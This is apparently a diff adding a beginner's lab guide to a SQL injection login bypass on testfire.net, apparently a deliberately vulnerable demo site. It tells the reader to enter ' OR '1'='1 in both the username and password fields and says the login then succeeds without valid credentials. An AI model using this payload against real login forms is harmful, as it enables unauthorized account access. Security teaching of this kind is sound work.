@@ -1,0 +1,29 @@
+✅ Step 1: Open Website
+
+Open Chrome and go to:
+
+👉 http://testfire.net
+
+Click:
+
+➡ Sign In
+
+🔓 Step 2: Perform SQL Injection
+
+In the Username field type:
+
+' OR '1'='1
+
+
+In Password field type:
+
+' OR '1'='1
+
+
+Click 👉 Login
+
+🎉 Result:
+
+You will be logged in without valid credentials.
+
+👉 SQL Injection successful!
